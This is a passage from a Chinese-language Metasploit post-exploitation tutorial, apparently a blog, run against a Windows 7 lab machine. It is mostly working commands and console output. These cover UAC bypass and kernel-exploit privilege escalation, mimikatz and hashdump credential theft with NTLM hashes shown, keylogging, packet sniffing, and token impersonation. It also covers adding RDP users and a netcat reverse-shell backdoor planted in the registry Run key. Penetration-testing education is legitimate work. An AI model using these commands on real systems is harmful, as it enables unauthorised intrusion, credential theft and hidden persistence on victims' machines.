<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.22.170:4444 -&gt; 192.168.22.171:59068) at 2018-12-18 22:12:04 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; use exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/bypassuac_eventvwr):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[*] Configuring payload and stager registry keys ...</span><br><span class="line">[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe</span><br><span class="line">[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 4 opened (192.168.22.170:4444 -&gt; 192.168.22.171:59075) at 2018-12-18 22:25:01 -0500</span><br><span class="line">[*] Cleaning up registry keys ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<h3><span id="nei-he-lou-dong-ti-quan">内核漏洞提权</span><a href="#nei-he-lou-dong-ti-quan" class="header-anchor">#</a></h3><p>可先利用<code>enum_patches</code>模块收集补丁信息，然后查找可用的<code>exploits</code>进行提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/ms10_092_schelevator </span><br><span class="line">msf exploit(windows/local/ms10_092_schelevator) &gt; set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf exploit(windows/local/ms10_092_schelevator) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] Preparing payload at C:\Users\Win7\AppData\Local\Temp\IsamdcUIQQzv.exe</span><br><span class="line">[*] Creating task: lk6j4xdPvbMB</span><br><span class="line">[*] �ɹ�: �ɹ������ƻ����� &quot;lk6j4xdPvbMB&quot;��</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Reading the task file contents from C:\Windows\system32\tasks\lk6j4xdPvbMB...</span><br><span class="line">[*] Original CRC32: 0xd75a78d9</span><br><span class="line">[*] Final CRC32: 0xd75a78d9</span><br><span class="line">[*] Writing our modified content back...</span><br><span class="line">[*] Validating task: lk6j4xdPvbMB</span><br><span class="line">[*] ����: �޷���������Դ��</span><br><span class="line">[*] Disabling the task...</span><br><span class="line">[*] �ɹ�: �����˼ƻ����� &quot;lk6j4xdPvbMB&quot; �Ĳ�����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Enabling the task...</span><br><span class="line">[*] �ɹ�: �����˼ƻ����� &quot;lk6j4xdPvbMB&quot; �Ĳ�����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Executing the task...</span><br><span class="line">[*] �ɹ�: �������� &quot;lk6j4xdPvbMB&quot;��</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Deleting the task...</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] �ɹ�: �ƻ������� &quot;lk6j4xdPvbMB&quot; ���ɹ�ɾ����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Meterpreter session 6 opened (192.168.22.170:4444 -&gt; 192.168.22.171:50044) at 2018-12-18 23:00:31 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<h2><span id="mimikatz-zhua-qu-mi-ma">mimikatz抓取密码</span><a href="#mimikatz-zhua-qu-mi-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">Loading extension mimikatz...[!] Loaded x86 Mimikatz on an x64 architecture.</span><br><span class="line"></span><br><span class="line">[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7600).). Did you mean to &apos;load kiwi&apos; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID     Package    Domain        User           Password</span><br><span class="line">------     -------    ------        ----           --------</span><br><span class="line">0;4181124  NTLM       WIN-7         Administrator  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;362944   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;362915   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;996      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;47330    NTLM                                    mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;999      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : win-7.uknowsec.cn</span><br><span class="line">BootKey    : 3a0c900d7f8d17e229f42745cc605dfe</span><br><span class="line"></span><br><span class="line">Rid  : 500</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 45a524862326cb9e7d85af4017a000f0</span><br><span class="line"></span><br><span class="line">Rid  : 501</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">Rid  : 1001</span><br><span class="line">User : Win7</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure>
<h2><span id="yuan-cheng-zhuo-mian-amp-jie-ping">远程桌面&amp;截屏</span><a href="#yuan-cheng-zhuo-mian-amp-jie-ping" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">set_desktop   #设置meterpreter关联的桌面  -h查看帮助</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br></pre></td></tr></table></figure>
<h2><span id="kai-qi-rdp-amp-tian-jia-yong-hu">开启rdp&amp;添加用户</span><a href="#kai-qi-rdp-amp-tian-jia-yong-hu" class="header-anchor">#</a></h2><h4><span id="getgui-ming-ling">getgui命令</span><a href="#getgui-ming-ling" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run getgui –h #查看帮助</span><br><span class="line">run getgui -e #开启远程桌面</span><br><span class="line">run getgui -u lltest2 -p 123456   #添加用户</span><br><span class="line">run getgui -f 6661 –e   #3389端口转发到6661</span><br></pre></td></tr></table></figure>
<ol>
<li><code>getgui</code> 系统不推荐，推荐使用<code>run post/windows/manage/enable_rdp</code></li>
<li><code>getgui</code>添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆</li>
</ol>
<h4><span id="enable-rdp-jiao-ben">enable_rdp脚本</span><a href="#enable-rdp-jiao-ben" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure>
<p>脚本位于<code>/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</code><br>通过<code>enable_rdp.rb</code>脚本可知：开启<code>rdp</code>是通过<code>reg</code>修改注册表；添加用户是调用<code>cmd.exe</code>通过<code>net user</code>添加；端口转发是利用的<code>portfwd</code>命令</p>
<h2><span id="jian-pan-ji-lu">键盘记录</span><a href="#jian-pan-ji-lu" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>
<h2><span id="sniffer-zhua-bao">sniffer抓包</span><a href="#sniffer-zhua-bao" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer</span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line"></span><br><span class="line">1 - &apos;WAN Miniport (Network Monitor)&apos; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</span><br><span class="line">2 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br><span class="line">3 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br></pre></td></tr></table></figure>
<h2><span id="zhu-ce-biao-cao-zuo">注册表操作</span><a href="#zhu-ce-biao-cao-zuo" class="header-anchor">#</a></h2><h3><span id="zhu-ce-biao-ji-ben-ming-ling">注册表基本命令</span><a href="#zhu-ce-biao-ji-ben-ming-ling" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg –h</span><br><span class="line">    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称</span><br><span class="line">    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据</span><br></pre></td></tr></table></figure>
<h3><span id="zhu-ce-biao-she-zhi-nc-hou-men">注册表设置nc后门</span><a href="#zhu-ce-biao-she-zhi-nc-hou-men" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line"></span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</span><br><span class="line">[*] uploading  : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32</span><br><span class="line">[*] uploaded   : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32\nc.exe</span><br><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">	VMware User Process</span><br><span class="line"></span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos;</span><br><span class="line">Successfully set lltest_nc of REG_SZ.</span><br><span class="line">meterpreter &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc</span><br><span class="line">Key: HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line">Name: lltest_nc</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc 192.168.22.171 443</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">win-7\win7</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="ling-pai-cao-zong">令牌操纵</span><a href="#ling-pai-cao-zong" class="header-anchor">#</a></h2><h3><span id="incognito-jia-mou-ling-pai">incognito假冒令牌</span><a href="#incognito-jia-mou-ling-pai" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-7\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; rev2self </span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-7\Administrator</span><br></pre></td></tr></table></figure>
<h3><span id="steal-token-qie-qu-ling-pai">steal_token窃取令牌</span><a href="#steal-token-qie-qu-ling-pai" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; steal_token 3416</span><br><span class="line">Stolen token with username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; drop_token </span><br><span class="line">Relinquished token, now running as: WIN-7\Administrator</span><br></pre></td></tr></table></figure>
<h2><span id="ha-xi-li-yong">哈希利用</span><a href="#ha-xi-li-yong" class="header-anchor">#</a></h2><h3><span id="huo-qu-ha-xi">获取哈希</span><a href="#huo-qu-ha-xi" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump  #从SAM导出密码哈希</span><br><span class="line">#需要SYSTEM权限</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/20181219014335_default_192.168.22.171_windows.hashes_427821.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*] 	Obtaining the boot key...</span><br><span class="line">[*] 	Calculating the hboot key using SYSKEY 3a0c900d7f8d17e229f42745cc605dfe...</span><br><span class="line">[*] 	Obtaining the user list and keys...</span><br><span class="line">[*] 	Decrypting user keys...</span><br><span class="line">[*] 	Dumping password hints...</span><br><span class="line">[*] 	No users with password hints on this system</span><br><span class="line">[*] 	Dumping password hashes...</span><br><span class="line">[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:45a524862326cb9e7d85af4017a000f0:::</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h3><span id="psexec-ha-xi-chuan-di">PSExec哈希传递</span><a href="#psexec-ha-xi-chuan-di" class="header-anchor">#</a></h3><p>通过<code>smart_hashdump</code>获取用户哈希后，可以利用<code>psexec</code>模块进行哈希传递攻击<br>前提条件：</p>
<ol>
<li>开启445端口 smb服务</li>
<li>开启admin$共享</li>
</ol>
